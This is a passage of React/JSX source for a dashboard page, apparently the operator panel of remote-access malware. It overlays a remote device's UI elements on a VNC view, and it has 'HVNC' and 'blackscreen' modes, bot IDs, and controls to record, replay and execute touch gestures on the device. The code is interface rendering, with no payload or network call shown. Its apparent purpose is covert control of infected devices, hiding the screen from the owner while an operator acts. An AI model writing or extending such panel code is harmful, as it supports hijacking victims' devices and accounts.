                        disabledViews.includes(node.lv) ? null : (
                          //node.i.description === 'blackscreen' &&
                        mouseMoveCoords.x >= node.s.l && mouseMoveCoords.x <= node.s.r && mouseMoveCoords.y >= node.s.t && mouseMoveCoords.y <= node.s.b || vncActive === false || vncShown === false || blackscreenon || screenon === false || selectedChild === index || vncGettingActivated === true ? (
                        <div>
                          {showTooltips === true ? (
                            <Tooltip title={"Clickable: " + node.i.cl + "\n Editable: " + node.i.e + " Description: " + node.i.d } sx={{fontSize: '10px'}} arrow>
                                  <div
                              key={node.i.c}
                              style={{
                                position: 'absolute',
                                left: node.s.l / scaleFactor + "px",
                                top: node.s.t / scaleFactor + "px",
                                width: (node.s.r - node.s.l) / scaleFactor + "px",
                                height: (node.s.b - node.s.t) /scaleFactor + "px",
                                border: "2px solid",
                                borderColor: `${selectedChild === index ? 'blue' : node.i.cl ? 'red' : vncActive && blackscreenon && vncShown ? "white" : "black"}`,
                                display: 'flex',
                                justifyContent: 'center',
                              }}
                              onContextMenu={() => mouseDownAction === "click_coord" ? null : handleClick(index)}
                              onDoubleClick={handleDouble(index)}
                            >
                              {showText === true ? (
                                <span     style={{
                                  userSelect: "none",
                                  fontSize:  value + "px",
                                  fontWeight: 'bold',
                                  textAlign: 'center',
                                  color : `${vncActive && blackscreenon && vncShown ? "white" : "black"}`,
                                }}>{node.i.tx}</span>
                              ) : null}
                              
                            </div>
                            </Tooltip>
                          ) : (
                            <div
                              key={node.i.c}
                              style={{
                                position: 'absolute',
                                left: node.s.l / scaleFactor + "px",
                                top: node.s.t / scaleFactor + "px",
                                width: (node.s.r - node.s.l) / scaleFactor + "px",
                                height: (node.s.b - node.s.t) /scaleFactor + "px",
                                border: "2px solid",
                                borderColor: `${selectedChild === index ? 'blue' : node.i.cl ? 'red' : vncActive && blackscreenon && vncShown ? "white" : "black"}`,
                                display: 'flex',
                                justifyContent: 'center',
                              }}
                              onContextMenu={() => mouseDownAction === "click_coord" ? null : handleClick(index)}
                              onDoubleClick={handleDouble(index)}
                            >
                              {showText === true ? (
                              <span     style={{
                                userSelect: "none",
                                fontSize:  value + "px",
                                fontWeight: 'bold',
                                textAlign: 'center',
                                color : `${vncActive && blackscreenon && vncShown ? "white" : "black"}`,
                              }}>{node.i.tx}</span>
                              ) : null}
                            </div>
                          )}
                        
                        </div>
                        ) : null
                      )))) : isOnline && hvnc === false ? <center>HVNC OFF</center> :
                      <center>ID NOT FOUND</center>
                      }   

                  </div>
                  </CardContent>
                </Card>
                </Grid>

                {(selectedChild != -1 && skeletonData[selectedChild] ) && (
                  <Grid item xs={12} sm={6} md={4}>
                      <Card sx={{minHeight: '200px', width: '300px', ml: 3}}>
                        <CardContent>
                            <Box
                        bgcolor="primary.main"
                        color="primary.contrastText"
                        p={2}
                        borderRadius={1}
                        alignItems="center"
                        display="flex"
                        height={45}
                        width={"100%"}
                    >
                        <SvgIcon fontSize="medium">
                              <FontAwesomeIcon icon={faArrowPointer}/>
                            </SvgIcon>
                            <Typography ml={1} variant='h6' color="primary.contrastText" >Selected Element</Typography>
                            
                        </Box>
                        <Box
                        mt={1}
                        bgcolor="primary.main"
                        color="primary.contrastText"
                        p={2}
                        borderRadius={1}
                        alignItems="center"
                        display="flex"
                        minHeight={60}
                        width={"100%"}
                    >
                        <SvgIcon fontSize="medium">
                              <FontAwesomeIcon icon={faFont}/>
                            </SvgIcon>
                            <div
                              style={{
                                display: 'flex',
                                flexDirection: 'column',
                              }}
                            >
                            <Typography
                            ml={1}
                            variant="h6"
                          >
                            {skeletonData[selectedChild].i.tx ? skeletonData[selectedChild].i.tx : "undefined"}
                          </Typography></div>
                            
                        </Box>
                        <Box
                        mt={1}
                        bgcolor="primary.main"
                        color="primary.contrastText"
                        p={2}
                        borderRadius={1}
                        alignItems="center"
                        display="flex"
                        minHeight={60}
                        width={"100%"}
                    >
                        <SvgIcon fontSize="medium">
                              <FontAwesomeIcon icon={faClosedCaptioning}/>
                            </SvgIcon>
                            <div
                              style={{
                                display: 'flex',
                                flexDirection: 'column',
                              }}
                            >
                            <Typography
                            ml={1}
                            variant="h6"
                          >
                            {skeletonData[selectedChild].i.d ? skeletonData[selectedChild].i.d : "undefined"}
                          </Typography></div>
                            
                        </Box>
                        
                        <Box
                        mt={1}
                        bgcolor="primary.main"
                        color="primary.contrastText"
                        p={2}
                        borderRadius={1}
                        alignItems="center"
                        display="flex"
                        minHeight={60}
                        width={"100%"}
                    >
                        <SvgIcon fontSize="medium">
                              <FontAwesomeIcon icon={faPen}/>
                            </SvgIcon>
                            <div
                              style={{
                                display: 'flex',
                                flexDirection: 'column',
                              }}
                            >
                            <Typography
                            ml={1}
                            variant="h6"
                          >
                            {skeletonData[selectedChild].i.e ? "Editable" : skeletonData[selectedChild].i.sw ? "Checkable" : "Cant edit or check"}
                          </Typography></div>
                            
                        </Box>
                        {skeletonData[selectedChild].i.sw && (
                          <Box
                        mt={1}
                        bgcolor="primary.main"
                        color="primary.contrastText"
                        p={2}
                        borderRadius={1}
                        alignItems="center"
                        display="flex"
                        minHeight={60}
                        width={"100%"}
                    >
                        <SvgIcon fontSize="medium">
                              {skeletonData[selectedChild].i.ch ? <FontAwesomeIcon icon={faSquareCheck} />: <FontAwesomeIcon icon={faSquare} />}
                            </SvgIcon>
                            <div
                              style={{
                                display: 'flex',
                                flexDirection: 'column',
                              }}
                            >
                            <Typography
                            ml={1}
                            variant="h6"
                          >
                            {skeletonData[selectedChild].i.ch ? "Checked" : "Not Checked"}
                          </Typography></div>
                            
                        </Box>
                        )}
                        </CardContent>
                      </Card>

                </Grid>
                )}
                

                  {showGestureRecording && (
                    <Grid item xs={12} sm={6} md={4}>
                <Card sx={{ height: '900px', width: '400px' }} >
                  <CardContent>
                  <Grid container display={"grid"} gridTemplateColumns={"1fr 1fr 1fr"} gap={"10px"} justifyContent={'center'} marginTop={1} alignItems={"center"}>
                  {!isRecording ? <Button sx={{ width: 80}} onClick={() => {handleGestureCommands("start_record_gesture"); setisRecording(true)}} variant="contained">Record</Button> :
                  <Button sx={{width: 80}} onClick={() => {handleGestureCommands("stop_record_gesture"); setisRecording(false); getGestures();}} variant="contained">Stop</Button>
                  }
                  
                  <Button sx={{width: 80}} variant="contained" onClick={handleGestureClearClick}>
                    Clear
                  </Button>
                  <Button sx={{width: 80}} variant="contained" onClick={getGestures}>
                    Refresh
                  </Button>
                </Grid>
                <TableContainer style={{marginTop: 20}} component={Paper}>
                  <Table aria-label="simple table">
                    <TableHead>
                      <TableRow>
                        <TableCell>Time</TableCell>
                        <TableCell>Play</TableCell>
                        <TableCell>Exec</TableCell>
                        <TableCell>Info</TableCell>
                        <TableCell>Delete</TableCell>
                      </TableRow>
                    </TableHead>
                    <TableBody>
                      {gestureData != null ? gestureData.map((row, index) => (
                        <TableRow key={row.uuid}>
                          <TableCell component="th" scope="row">
                            {row.date}
                          </TableCell>
                          <TableCell>
                            {(!isAnimating && isCurrentGesture(row.uuid)) && <Button variant="contained" sx={{width: 50}} color="primary" onClick={() => {handlestartGesturePlayback(row)}}>Play</Button> }
                            {(!isAnimating && !isCurrentGesture(row.uuid)) && <Button variant="contained" sx={{width: 50}} color="primary" onClick={() => {handlestartGesturePlayback(row)}}>Play</Button> }
                            {(isAnimating && !isCurrentGesture(row.uuid)) && <Button variant="contained" sx={{width: 50}} color="primary" onClick={() => {handlestartGesturePlayback(row)}}>Play</Button> }
                            {(isAnimating && isCurrentGesture(row.uuid)) && <Button variant="contained"  sx={{width: 50}}  color="primary" onClick={() => {handleGestureClearClick()}}>Stop</Button>}
                            </TableCell>
                            <TableCell>
                             <Button variant="contained" color="primary" onClick={() => {handleExecGesture(JSON.parse(row.gesture))}}>Exec</Button>
                            </TableCell>
                            <TableCell>
                             <Button variant="contained" color="primary" onClick={() => togglePopup(row.uuid)}>Info</Button>
                             <Gesture
                              open={openGesturePopups[row.uuid]}
                              handleClose={() => togglePopup(row.uuid)}
                              gesture={row}
                              idbot={idbot}
                              />
                            </TableCell>
                            <TableCell>
                             <Button variant="contained" color="primary" onClick={() => {delGesture(row.uuid)}}>Delete</Button>
                            </TableCell>
                        </TableRow>
                      )) : null}
                    </TableBody>
                  </Table>
                </TableContainer>
                </CardContent>
                </Card></Grid>)}
            </Grid>
        </Stack>
      </Container>
    </Box>
  </>
);
}

Page.getLayout = (page) => (
  <DashboardLayout>
    {page}
  </DashboardLayout>
);

export default Page;
